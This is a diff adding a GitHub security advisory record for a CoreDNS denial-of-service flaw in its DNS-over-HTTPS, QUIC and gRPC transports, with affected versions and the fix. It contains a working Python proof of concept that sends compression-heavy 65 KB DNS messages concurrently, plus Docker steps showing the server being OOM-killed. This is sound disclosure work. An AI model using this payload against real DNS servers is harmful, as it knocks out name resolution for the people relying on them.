@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-mrg3-qvqr-jw29",
+  "modified": "2026-09-17T20:45:05.982963129Z",
+  "published": "2026-09-17T20:32:27Z",
+  "aliases": [
+    "CVE-2026-82399"
+  ],
+  "summary": "CoreDNS: Unauthenticated memory exhaustion in custom transports",
+  "details": "### Summary\n\nCoreDNS parses attacker-controlled DNS section counts before validating them on DNS-over-HTTPS (DoH and DoH3), DNS-over-QUIC (DoQ), and DNS-over-gRPC listeners. An unauthenticated client can use DNS name compression to make one\n65,533-byte request allocate more than 10 MiB while it is unpacked. Concurrent requests can exhaust memory and terminate CoreDNS.\n\n### Details\n\nThe affected request paths call `dns.Msg.Unpack` directly:\n\n- [DoH POST and GET decoding](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/pkg/doh/doh.go#L134-L155). DoH3 uses the same decoder.\n- [DoQ stream handling](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/core/dnsserver/server_quic.go#L212-L219).\n- [DNS-over-gRPC query handling](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/core/dnsserver/server_grpc.go#L176-L184).\n\nThis differs from the [miekg/dns](https://github.com/miekg/dns) UDP and TCP server. Its [`serveDNS`](https://github.com/miekg/dns/blob/v1.1.72/server.go#L628-L643) path decodes the fixed 12-byte header and invokes [`DefaultMsgAcceptFunc`](https://github.com/miekg/dns/blob/v1.1.72/acceptfunc.go#L33-L57) before unpacking the DNS sections. The default policy rejects requests unless `QDCOUNT` is exactly one and also limits the other section counts. CoreDNS's custom transports bypass this early validation.\n\nParsing happens before the plugin chain. Plugin-level rate limiting or request handling cannot prevent the allocation. The fix is to apply `dns.DefaultMsgAcceptFunc` to the fixed header before calling `Msg.Unpack` in each custom request transport. Response decoding must remain separate because the request policy intentionally rejects response headers.\n\n### PoC\n\nThe PoC runs against the DoH server.\n\nRun the following from a clean checkout of CoreDNS v1.14.6. Docker must support container memory limits. The example uses the test certificate already present in the repository and publishes the test service only on loopback.\n\n\nSave this as `Corefile.cd01`:\n\n```text\nhttps://.:8053 {\n    tls /cert.pem /key.pem\n    whoami\n}\n```\n\nSave this standard-library client as `poc-cd01.py`:\n\n```python\n#!/usr/bin/env python3\nimport argparse\nimport concurrent.futures\nfrom collections import Counter\nimport http.client\nimport ssl\nimport struct\n\n\ndef normal_query():\n    header = struct.pack(\"!HHHHHH\", 0x1234, 0x0100, 1, 0, 0, 0)\n    question = b\"\\x07example\\x03org\\x00\" + struct.pack(\"!HH\", 1, 1)\n    return header + question, 1\n\n\ndef attack_query():\n    message = bytearray(65535)\n    offset = 12\n    name_offset = offset\n\n    for size in (63, 63, 63, 61):\n        message[offset] = size\n        offset += 1\n        message[offset : offset + size] = b\"\\x01\" * size\n        offset += size\n\n    message[offset] = 0\n    offset += 1\n    struct.pack_into(\"!HH\", message, offset, 1, 1)\n    offset += 4\n    questions = 1\n\n    while offset + 6 \u003c= len(message):\n        struct.pack_into(\"!HHH\", message, offset, 0xC000 | name_offset, 1, 1)\n        offset += 6\n        questions += 1\n\n    struct.pack_into(\n        \"!HHHHHH\", message, 0, 0x1234, 0x0100, questions, 0, 0, 0\n    )\n    return bytes(message[:offset]), questions\n\n\ndef send(payload):\n    context = ssl._create_unverified_context()\n    connection = http.client.HTTPSConnection(\n        \"127.0.0.1\", 18053, timeout=3, context=context\n    )\n    try:\n        connection.request(\n            \"POST\",\n            \"/dns-query\",\n            body=payload,\n            headers={\"Content-Type\": \"application/dns-message\"},\n        )\n        response = connection.getresponse()\n        response.read()\n        return f\"http-{response.status}\"\n    except Exception:\n        return \"error\"\n    finally:\n        connection.close()\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--normal\", action=\"store_true\")\n    parser.add_argument(\"--workers\", type=int, default=1)\n    args = parser.parse_args()\n\n    payload, questions = normal_query() if args.normal else attack_query()\n    print(\n        f\"payload={len(payload)} questions={questions} workers={args.workers}\"\n    )\n    with concurrent.futures.ThreadPoolExecutor(args.workers) as pool:\n        results = pool.map(send, [payload] * args.workers)\n    print(Counter(results))\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nBuild the Linux binary and container image:\n\n```sh\nGOCACHE=/tmp/coredns-gocache \\\nGOOS=linux GOARCH=\"$(go env GOARCH)\" CGO_ENABLED=0 \\\ngo build -tags=grpcnotrace -o coredns .\ndocker build --tag coredns-cd01:vulnerable .\n```\n\nStart CoreDNS with a 64 MiB memory and swap limit:\n\n```sh\ndocker run --detach --name coredns-cd01 \\\n  --memory 64m --memory-swap 64m \\\n  --publish 127.0.0.1:18053:8053/tcp \\\n  --volume \"$PWD/Corefile.cd01:/Corefile:ro\" \\\n  --volume \"$PWD/plugin/tls/test_cert.pem:/cert.pem:ro\" \\\n  --volume \"$PWD/plugin/tls/test_key.pem:/key.pem:ro\" \\\n  coredns-cd01:vulnerable -conf /Corefile\n```\n\nConfirm that the listener works and that one malicious request is accepted:\n\n```console\n$ python3 poc-cd01.py --normal\npayload=29 questions=1 workers=1\nCounter({'http-200': 1})\n\n$ python3 poc-cd01.py\npayload=65533 questions=10878 workers=1\nCounter({'http-200': 1})\n```\n\nSend 32 malicious requests concurrently and inspect the container:\n\n```console\n$ python3 poc-cd01.py --workers 32\npayload=65533 questions=10878 workers=32\nCounter({'error': 32})\n\n$ docker inspect --format '{{.State.Status}} OOMKilled={{.State.OOMKilled}} ExitCode={{.State.ExitCode}}' coredns-cd01\nexited OOMKilled=true ExitCode=137\n```\n\n`OOMKilled=true` confirms that the container was terminated by memory exhaustion rather than a CoreDNS configuration error.\n\n### Impact\n\nThis is an unauthenticated denial-of-service vulnerability. Deployments are affected when DoH, DoH3, DoQ, or DNS-over-gRPC is exposed to an attacker. The ordinary miekg/dns UDP and TCP listeners are not affected because they perform the header acceptance check before unpacking.\n\nIn the validated configuration, 32 requests OOM-killed a CoreDNS container limited to 64 MiB. Higher memory limits increase the number of concurrent requests required but do not remove the allocation amplification. Successful exploitation interrupts DNS service.\n\nCoreDNS versions v007 through v1.14.6 are affected when DNS-over-gRPC is exposed. DoH is affected from v1.1.3, DoQ from v1.11.0, and DoH3 from v1.13.2.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/coredns/coredns",
+        "purl": "pkg:golang/github.com/coredns/coredns"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.14.7"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.14.6",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-mrg3-qvqr-jw29/GHSA-mrg3-qvqr-jw29.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/coredns/coredns/security/advisories/GHSA-mrg3-qvqr-jw29"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82399"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/coredns/coredns/commit/530b0a5ff2ad68cc0421f10dd93568945cc671c9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/coredns/coredns"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/coredns/coredns/releases/tag/v1.14.7"
+    }
+  ]
+}
